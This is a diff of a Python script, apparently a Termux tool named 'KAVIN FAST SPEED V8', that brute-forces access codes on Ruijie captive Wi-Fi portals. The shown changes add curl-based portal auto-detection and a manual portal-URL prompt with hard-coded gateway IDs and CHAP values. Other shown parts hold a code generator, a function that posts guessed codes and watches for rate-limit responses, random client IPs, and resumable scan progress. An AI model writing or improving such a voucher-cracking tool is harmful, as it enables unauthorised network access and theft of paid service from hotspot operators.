@@ -1,5 +1,6 @@
 # =====================================================================
 # kavinv8.py - KAVIN FAST SPEED V8 (Part 1 of 4)
+# Termux Optimized
 # =====================================================================
 
 import os
@@ -13,6 +14,7 @@ import aiohttp
 import urllib3
 import socket
 import threading
+import subprocess
 import requests
 from urllib.parse import urlparse, parse_qs, quote
 from rich.console import Console
@@ -119,28 +121,38 @@ def extract_params_from_url(url):
 def auto_detect_portal():
     console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")),
                         border_style="cyan", box=ROUNDED))
-    session = requests.Session()
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
-
-    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
+    
+    # Termux အတွက် curl သုံးမယ်
     try:
-        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
-        if "ruijienetworks" in r.url:
-            return r.url
-    except: pass
+        result = subprocess.run(
+            ["curl", "-s", "-I", "http://connectivitycheck.gstatic.com/generate_204"],
+            capture_output=True, text=True, timeout=10
+        )
+        output = result.stdout
+        for line in output.split("\n"):
+            if line.lower().startswith("location:"):
+                url = line.split(":", 1)[1].strip()
+                if "ruijienetworks" in url:
+                    console.print(f"[bold green][+] Found via curl![/bold green]")
+                    return url
+    except Exception:
+        pass
 
     gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
     gateways = list(dict.fromkeys(gateways))
 
     for gw in gateways:
         try:
-            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
-            if "ruijienetworks" in res.url:
-                return res.url
-        except: pass
+            result = subprocess.run(
+                ["curl", "-s", "-L", f"http://{gw}"],
+                capture_output=True, text=True, timeout=10
+            )
+            if "ruijienetworks" in result.stdout:
+                console.print(f"[bold green][+] Found via Gateway ({gw})![/bold green]")
+                return f"http://{gw}"
+        except Exception:
+            pass
     return None
-
-# ---------------- Progress ----------------
 
 def save_progress(mode, length, scan_method, last_code, tested_count):
     try:
@@ -167,8 +179,6 @@ def load_progress():
 # =====================================================================
 # kavinv8.py - KAVIN FAST SPEED V8 (Part 2 of 4)
 # =====================================================================
-
-# ---------------- Code Generator ----------------
 
 def gen_code(mode, length, scan_method="random"):
     global seq_counter
@@ -197,8 +207,6 @@ def gen_code(mode, length, scan_method="random"):
         return "".join(random.choices(string.ascii_lowercase, k=length))
     else:
         return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
-
-# ---------------- Session (Up_url_mix.py အတိုင်း) ----------------
 
 async def fetch_official_session(session, gw_params, current_mac, current_ip):
     base_url = RUIJIE_WIFIDOG
@@ -301,7 +309,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
 
         try:
             async with session.post(url, json=payload, headers=headers,
-                                    ssl=False, timeout=10, allow_redirects=True) as resp:
+                                    timeout=10, allow_redirects=True, ssl=False) as resp:
                 if resp.status in (403, 429):
                     return "__RATE_LIMITED__", None
 
@@ -350,8 +358,6 @@ async def test_code_official(session, sess_data, code, mac, ip):
 # =====================================================================
 # kavinv8.py - KAVIN FAST SPEED V8 (Part 3 of 4)
 # =====================================================================
-
-# ---------------- Dashboard ----------------
 
 def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status,
                              hits, speed, cur_mac, cur_ip, tried_count, sess_stat,
@@ -416,8 +422,6 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     )
     layout["body"].update(body_layout)
     return layout
-
-# ---------------- Main Scan Loop ----------------
 
 async def scan_loop_async(mode, length, scan_method="random", gw_params=None, start_code="0"):
     global seq_counter, tried_codes
@@ -616,8 +620,6 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None, st
 # kavinv8.py - KAVIN FAST SPEED V8 (Part 4 of 4)
 # =====================================================================
 
-# ---------------- Menu ----------------
-
 def show_banner():
     clear_screen()
     console.print()
@@ -713,6 +715,30 @@ def run():
             "chap_challenge": extracted.get("chap_challenge",
                 r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
         }
+    else:
+        console.print("[bold red]Auto-detect မရပါ။ Portal URL ကို ကိုယ်တိုင်ထည့်ပါ။[/bold red]")
+        user_url = Prompt.ask("[bright_cyan]➜ Portal URL[/bright_cyan]").strip()
+        if user_url:
+            extracted = extract_params_from_url(user_url)
+            gw_params = {
+                "stage": "portal",
+                "gw_id": extracted.get("gw_id", "c4b25be7d323"),
+                "gw_sn": extracted.get("gw_sn", "H1U320P00210A"),
+                "gw_address": extracted.get("gw_address", "192.168.7.1"),
+                "gw_port": extracted.get("gw_port", "2060"),
+                "ip": generate_random_ip(),
+                "mac": "",
+                "slot_num": extracted.get("slot_num", "14"),
+                "nasip": extracted.get("nasip", "192.168.1.193"),
+                "ssid": extracted.get("ssid", "VLAN7"),
+                "ustate": "0", "mac_req": "1",
+                "url": extracted.get("url", "http://connectivitycheck.gstatic.com/generate_204"),
+                "chap_id": extracted.get("chap_id", r"\245"),
+                "chap_challenge": extracted.get("chap_challenge",
+                    r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
+            }
+        else:
+            return
 
     prog = load_progress()
     resume = False
